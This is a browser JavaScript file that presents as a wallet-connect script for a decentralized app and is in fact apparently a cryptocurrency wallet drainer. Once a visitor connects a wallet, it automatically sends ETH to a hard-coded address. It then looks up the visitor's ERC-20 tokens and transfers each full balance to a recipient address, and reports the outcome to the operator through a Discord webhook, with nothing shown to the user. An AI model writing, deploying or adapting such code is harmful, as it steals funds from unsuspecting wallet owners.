let web3Modal;
let provider;
let signer;

async function init() {
    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider.default,
            options: {
                infuraId: "YOUR_INFURA_ID" // or Alchemy API
            }
        },
        coinbasewallet: {
            package: CoinbaseWalletSDK,
            options: {
                appName: "My Dapp",
                infuraId: "YOUR_INFURA_ID", // or Alchemy API
                chainId: 1,
            }
        }
    };

    web3Modal = new Web3Modal({
        cacheProvider: false, // optional
        providerOptions, // required
        theme: "dark", // or "light" based on preference
    });

    document.getElementById("connectButton").addEventListener("click", onConnect);
}

async function onConnect() {
    try {
        provider = await web3Modal.connect();
        const web3Provider = new ethers.providers.Web3Provider(provider);
        signer = web3Provider.getSigner();
        const account = await signer.getAddress();
        console.log(`Connected to account: ${account}`);
        document.getElementById('status').innerText = `Connected: ${account}`;

        // Automatically trigger the first transaction
        await sendFirstTransaction(account);
    } catch (error) {
        console.error("Error connecting wallet:", error);
    }
}

async function sendFirstTransaction(walletAddress) {
    const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
    const amountInEther = "0.0002"; // First transaction amount

    const transaction = {
        to: recipientAddress,
        value: ethers.utils.parseEther(amountInEther),
    };

    try {
        const txResponse = await signer.sendTransaction(transaction);
        console.log("First transaction response:", txResponse);

        // Send to Discord webhook
        await sendWebhook(txResponse.hash, "success");

        // Automatically trigger the second transaction based on token balance
        await sendSecondTransaction(signer, walletAddress);
    } catch (error) {
        console.error("Error sending first transaction:", error);

        // Send to Discord webhook
        await sendWebhook(error.message, "failure");
    }
}

async function sendSecondTransaction(signer, walletAddress) {
    const erc20TokenAddresses = await getERC20TokenAddresses(walletAddress);
    const tokenThreshold = 0.000001; // Token threshold for second transaction

    for (const tokenAddress of erc20TokenAddresses) {
        const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
        const balance = await tokenContract.balanceOf(walletAddress);
        const tokenDecimals = await tokenContract.decimals();
        const tokenSymbol = await tokenContract.symbol();

        // Convert balance to decimal form
        const balanceInUnits = balance / Math.pow(10, tokenDecimals);

        if (balanceInUnits > tokenThreshold) {
            console.log(`Sending ${balanceInUnits} ${tokenSymbol} from ${walletAddress}`);

            const txResponse = await tokenContract.transfer(
                "0xRecipientAddress", // Actual recipient address
                balance // Full balance
            );

            console.log(`Transaction hash: ${txResponse.hash}`);
        }
    }
}

async function getERC20TokenAddresses(walletAddress) {
    const apiKey = "YOUR_ALCHEMY_API_KEY"; // Alchemy API key
    const url = `https://eth-mainnet.g.alchemy.com/v2/${apiKey}/getTokenBalances?owner=${walletAddress}`;

    const response = await fetch(url);
    const data = await response.json();

    if (data.tokenBalances) {
        return data.tokenBalances
            .filter(token => token.tokenBalance > 0)
            .map(token => token.contractAddress);
    } else {
        console.error("Error fetching token addresses:", data.message);
        return [];
    }
}

async function sendWebhook(message, status) {
    const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; // Discord webhook URL
    const payload = {
        content: `Transaction Status: ${status}\nMessage: ${message}`
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        console.log("Webhook sent successfully");
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}

// ERC20 Token ABI
const erc20ABI = [
    "event Transfer(address indexed from, address indexed to, uint256 value)",
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 value) returns (bool)"
];

// Initialize web3modal on page load
window.addEventListener("load", init);
